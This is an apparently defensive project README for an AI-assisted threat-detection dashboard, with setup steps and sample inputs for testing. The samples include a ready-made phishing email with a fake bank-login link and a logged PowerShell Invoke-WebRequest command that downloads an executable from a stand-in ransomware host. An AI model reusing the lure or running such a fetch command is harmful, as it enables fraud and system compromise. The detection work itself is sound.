<h1 align="center">🔐 AI-Powered Cybersecurity Threat Detection System 🚀</h1>

![Python](https://img.shields.io/badge/Python-3.9%2B-blueviolet) ![Streamlit](https://img.shields.io/badge/Streamlit-1.25%2B-brightgreen) ![Groq AI](https://img.shields.io/badge/Groq%20AI-Powered-blue)

## 🚀 Overview
This project is an **AI-powered cybersecurity tool** that analyzes text-based threats such as phishing emails, malicious network logs, and insider threats. It leverages the **Groq API** with the `qwen-2.5-32b` model and is built using **Python** and **Streamlit** for real-time security insights.

## 🔥 Features
- **Phishing Email Detection** – Identifies suspicious emails and malicious links.
- **Network Log Analysis** – Detects unusual login attempts and C2 traffic.
- **Insider Threat Monitoring** – Flags unauthorized access and data exfiltration.
- **Real-time Threat Intelligence** – Displays live security data.
- **User-Friendly Interface** – Interactive Streamlit dashboard.

## 🛠️ Installation & Setup
### 1️⃣ Clone the Repository
```bash
git clone https://github.com/your-username/AI-Powered-Cybersecurity-Threat-Detection-System.git
cd AI-Powered-Cybersecurity-Threat-Detection-System
```

### 2️⃣ Install Dependencies
```bash
pip install -r requirements.txt
```

### 3️⃣ Set Up Groq API Key
Edit the script and replace `"YOUR_GROQ_API_KEY"` with your actual API key:
```python
client = Groq(api_key="YOUR_GROQ_API_KEY")
```

### 4️⃣ Run the Application
```bash
streamlit run your_script.py
```

## 🎯 Usage
1. Open the Streamlit app.
2. Enter network logs, email content, or suspicious text.
3. Click **Analyze Threat** to get AI-driven security insights.
4. Review **live threat intelligence** in the dashboard.

## 📌 Example Test Cases
## 1️⃣ Phishing Email Detection
### 📩 Input (Phishing Email Example):
**Input:**
```
Subject: Urgent! Your Account Will Be Suspended  

Dear Customer,  

We have noticed suspicious activity on your account. Please verify your identity immediately by clicking the link below:  
🔗 http://secure-bank-login-verification.com  

Failure to do so within 24 hours will result in account suspension.  

Best,  
Bank Security Team

```
| **OUTPUT** 🚨 |
|------------------------------------------------------------------------------------------------------------------------|
| ![Phishing Email Detection_page-0001](https://github.com/user-attachments/assets/0b10fe7d-fba2-4b43-b9de-360d7756bf88) |


## 2️⃣ Malicious Network Activity (Log Analysis)
### 📜 Input (Suspicious Firewall Logs):
**Input:**
```
[WARNING] Multiple failed SSH login attempts detected from IP 185.220.101.25  
[ALERT] Unusual traffic detected from internal server to 145.34.76.98 on port 4444 (Common C2 channel)  

```
| **OUTPUT** 🚨 |
|-----------------------------------------------------------------------------------------------------------------------------------------|
| ![Malicious Network Activity (Log Analysis)_page-0001](https://github.com/user-attachments/assets/465eaf06-484e-4019-b1e6-f786581eed57) |

## 3️⃣ Ransomware Attack Alert (Security Log Review)
### 📄 Input (Windows Event Log from a Compromised System):
**Input:**
```
Event ID 4688: New process created - C:\Users\Public\decrypt_files.exe  
Event ID 5145: Network file access by process - \\shared_drive\important_files\  
Event ID 4104: PowerShell script execution - Invoke-WebRequest http://malicious-ransomware-server.com/download.exe  

```
| **OUTPUT** 🚨 |
|---------------------------------------------------------------------------------------------------------------------------------------------|
| ![Ransomware Attack Alert (Security Log Review)_page-0001](https://github.com/user-attachments/assets/1f32947b-eed1-4b38-9790-1b56240e4189) |

## 4️⃣ Data Exfiltration via Suspicious Email Attachment
### 📩 Input (Email with Potentially Malicious Attachment):
**Input:**
```
Subject: Important Update - Invoice Attached  

Hello,  

Please find the invoice attached for your review. Let us know if you have any questions.  

Regards,  
John Doe  
Attachment: invoice_12345.zip  

```
| **OUTPUT** 🚨 |
|-------------------------------------------------------------------------------------------------------------------------------------------------|
| ![Data Exfiltration via Suspicious Email Attachment_page-0001](https://github.com/user-attachments/assets/e1cc6b79-e752-4686-915e-2fcf25367d2d) |

## 5️⃣ Insider Threat (Suspicious Employee Activity)
### 📝 Input (Unusual File Transfers Logged in SIEM)
**Input:**
```
User: Alice from HR  
Action: Downloaded 100+ sensitive files from HR database  
Time: 2:30 AM (Non-working hours)  
Destination: External USB drive detected  

```
| **OUTPUT** 🚨 |
|---------------------------------------------------------------------------------------------------------------------------------------------|
| ![Insider Threat (Suspicious Employee Activity)_page-0001](https://github.com/user-attachments/assets/36248013-944f-4b6c-bb12-73ce915108f2) |



## 🤝 Contributing
Feel free to **fork** the repository, submit **issues**, or contribute **pull requests** to improve the project.

## 🔗 Contact & Support
Have questions or suggestions? Feel free to reach out:

- 📧 [Email](mailto:gauravghandat12@gmail.com)
- 💼 [LinkedIn](www.linkedin.com/in/gaurav-ghandat-68a5a22b4)

---
🚀 **Stay Secure & Keep Hacking Ethically!** 🔥

